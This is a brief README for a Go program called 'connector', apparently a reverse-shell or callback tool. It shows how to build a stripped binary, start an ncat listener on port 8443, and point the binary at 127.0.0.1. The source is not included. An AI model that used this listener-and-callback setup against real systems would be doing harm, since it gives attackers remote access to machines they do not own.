# connector

1. Compile code on endpoint os (OSX, Linux, Windows)

		blackops:development user$ go build -ldflags="-s -w" connector.go

2. Setup listener (locally)
  
		blackops:development user$ ncat -v -l -p 8443
  
3. Run binary from CLI 

		blackops:development user$ ./connector 127.0.0.1 8443 update
 
